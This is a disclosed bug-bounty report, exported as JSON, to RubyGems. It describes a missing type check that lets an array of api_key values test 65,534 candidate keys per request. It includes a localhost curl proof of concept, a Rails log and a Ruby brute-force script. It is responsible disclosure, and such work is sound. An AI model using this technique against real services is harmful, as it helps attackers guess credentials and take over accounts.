{
  "id": 449356,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDkzNTY=",
  "url": "https://hackerone.com/reports/449356",
  "title": "65534 times efficient, Brute-force attack for api_key",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2018-11-24T14:40:39.546Z",
  "submitted_at": "2018-11-24T14:40:39.546Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ooooooo_q",
    "url": "/ooooooo_q",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 8212,
    "url": "https://hackerone.com/rubygems",
    "handle": "rubygems",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "RubyGems",
      "twitter_handle": "rubygems_status",
      "website": "https://rubygems.org",
      "about": "RubyGems.org is the Ruby community’s gem hosting service."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-12-08T19:38:26.977Z",
  "bug_reporter_agreed_on_going_public_at": "2018-12-06T22:41:42.392Z",
  "team_member_agreed_on_going_public_at": "2018-12-08T19:38:26.925Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I have found that type checking for `api_key` is insufficient in rubygems.org's source code.\n\nhttps://github.com/rubygems/rubygems.org/blob/master/app/controllers/application_controller.rb#L63\n\n```ruby\ndef authenticate_with_api_key\n  api_key   = request.headers[\"Authorization\"] || params[:api_key]\n  @api_user = User.find_by_api_key(api_key)\nend\n```\nUsing an array in `params[:api_key]` makes searching for api_key more efficient.\n\n\n### poc\n\n1. start server in local\n2. Access url with multiple api_key\n\n```\n$ curl --globoff 'http://localhost:3000/api/v1/gems?api_key[]=key1&api_key[]=key2'\n> Access Denied. Please sign up for an account at https://rubygems.org\n```\n\n##### rails log\n\n```log\nStarted GET \"/api/v1/gems?api_key[]=key1&api_key[]=key2\" for ::1 at 2018-11-24 23:03:30 +0900\nProcessing by Api::V1::RubygemsController#index as */*\n  Parameters: {\"api_key\"=>[\"key1\", \"key2\"]}\n  User Load (0.5ms)  SELECT  \"users\".* FROM \"users\" WHERE \"users\".\"api_key\" IN ($1, $2) LIMIT $3  [[\"api_key\", \"key1\"], [\"api_key\", \"key2\"], [\"LIMIT\", 1]]\n  ↳ app/controllers/application_controller.rb:65\n  Rendering text template\n  Rendered text template (0.0ms)\nFilter chain halted as :verify_authenticated_user rendered or redirected\nCompleted 401 Unauthorized in 2ms (Views: 0.3ms | ActiveRecord: 0.5ms | Elasticsearch: 0.0ms)\n```\n\n## Impact\n\nAs a result of trying how much it can be sent using POST, 65534 api_key's could be sent.\nA postgres error will occur if you send more values.\n\nHere is the script used for confirmation.\n\n```ruby\nrequire 'net/http'\nrequire 'securerandom'\nrequire 'json'\n\nkeys = 65534.times.map{SecureRandom.hex(32)}\n# keys = 65535.times.map{SecureRandom.hex(32)} # error\n\nuri = URI.parse(\"http://localhost:3000/api/v1/web_hooks/fire.json?url=http://example.com/\")\nhttp = Net::HTTP.new(uri.host, uri.port)\nreq = Net::HTTP::Post.new(uri.path)\nreq[\"Content-Type\"] = \"application/json\"\nreq.body = {api_key: keys}.to_json\n\nres = http.request(req)\n```\n\nAttacks against api_key are 65534 times more efficient, but since the string generated by `SecureRandom.hex (32)` has sufficient length, the impact seems to be minimal.",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-01-05T22:41:42.442Z",
  "allow_singular_disclosure_after": -161101953.58995935,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "sameerphad72",
    "ali",
    "dhakal_ananda",
    "reppie",
    "sonalkr132",
    "dineshpopz",
    "s3rgio1993"
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 2042,
    "asset_type": "URL",
    "asset_identifier": "rubygems.org",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
